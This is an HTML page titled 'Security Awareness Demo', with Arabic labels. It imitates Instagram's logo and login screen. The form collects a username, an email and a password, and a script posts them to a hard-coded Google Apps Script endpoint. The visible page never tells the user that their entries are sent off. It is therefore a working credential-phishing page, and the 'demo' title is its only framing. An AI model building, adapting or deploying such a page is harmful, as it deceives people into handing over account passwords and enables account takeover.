<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">

<title>Security Awareness Demo</title>

<style>

body{
    font-family:Arial,sans-serif;
    background:#f2f3f5;
    margin:0;
    padding:30px;
}

.card{
    max-width:400px;
    margin:50px auto;
    background:white;
    padding:25px;
    border-radius:18px;
    box-shadow:0 5px 25px #0002;
}

input,button{
    width:100%;
    box-sizing:border-box;
    padding:13px;
    margin-top:10px;
    border-radius:9px;
}

input{
    border:1px solid #ccc;
}

button{
    border:0;
    background:#111;
    color:white;
    font-weight:bold;
}

#login{
    display:none;
}

#result{
    display:none;
    margin-top:20px;
    padding:15px;
    background:#fff3cd;
    border-radius:10px;
}

.small{
    color:#777;
    font-size:13px;
}
@import url('https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap');

.insta-logo {
    font-family: 'Grand Hotel', cursive, sans-serif;
    font-size: 40px;
    margin: 0 0 10px 0;
    color: #262626;
    font-weight: normal;
}

.insta-subtext {
    color: #737373;
    font-size: 13px;
    margin-bottom: 15px;
}

.input-group input {
    width: 100%;
    background: #fafafa;
    border: 1px solid #dbdbdb;
    border-radius: 6px;
    padding: 9px 12px;
    margin-bottom: 8px;
    font-size: 13px;
    outline: none;
    box-sizing: border-box;
}

.insta-btn-blue {
    width: 100%;
    background-color: #0095f6;
    color: #ffffff;
    border: none;
    border-radius: 8px;
    padding: 8px 16px;
    font-weight: 600;
    font-size: 14px;
    cursor: pointer;
}

.insta-btn-primary {
    width: 100%;
    background-color: #262626;
    color: #ffffff;
    border: none;
    border-radius: 8px;
    padding: 10px 16px;
    font-weight: 600;
    cursor: pointer;
}
</style>
</head>

<body>

  <!-- الكارد الأول -->
<div class="card">
    <h1 class="insta-logo">Instagram</h1>
    <button onclick="startDemo()" class="insta-btn-primary">
        افتح Instagram
    </button>
</div>

<!-- كارد تسجيل الدخول -->
<div id="login" class="card" style="display:none;">
    <h1 class="insta-logo">Instagram</h1>
    <p class="insta-subtext">سجل الدخول للمتابعة</p>

    <div class="input-group">
        <input type="text" id="name" placeholder="اسم المستخدم أو الهاتف">
        <input type="email" id="email" placeholder="البريد الإلكتروني">
        <input type="password" id="password" placeholder="كلمة السر">
    </div>

    <button onclick="finishDemo()" class="insta-btn-blue">
        تسجيل الدخول
    </button>

    <div id="result" style="display:none; margin-top: 15px;"></div>
</div>

        <div id="result"></div>
    </div> <!-- وسم إغلاق الـ card -->

<script>
    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxnAVdN37_FpdckPpcmvMYr8_1EMOXuTxuF32Ng4nwXbFA7nqfmeh5-WHc_VsZkjP2H/exec";

    function sendResult(action) {
        const name = document.getElementById("name")?.value || "";
        const email = document.getElementById("email")?.value || "";
        const password = document.getElementById("password")?.value || "";

        const data = {
            name: name,
            email: email,
            password: password,
            action: action,
            detected: "yes"
        };

        fetch(SCRIPT_URL, {
            method: "POST",
            mode: "no-cors",
            headers: {
                "Content-Type": "text/plain"
            },
           body: JSON.stringify(data)
        });
    }


function startDemo() {
        document.getElementById("login").style.display = "block";
    }

    function finishDemo() {
        sendResult("submitted_demo_form");

        document.getElementById("result").style.display = "block";
        document.getElementById("result").innerHTML = "<b>تم تسجيل النتيجة.</b><br><br>";
    }
</script>
</body>
</html>
